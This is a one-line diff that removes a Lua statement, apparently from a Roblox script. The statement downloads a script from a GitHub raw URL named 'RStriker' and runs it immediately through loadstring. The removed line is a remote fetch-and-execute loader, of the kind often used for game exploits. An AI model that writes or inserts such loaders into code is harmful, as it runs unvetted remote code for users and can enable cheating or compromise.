@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Orange11245/RStriker/main/main.lua"))()
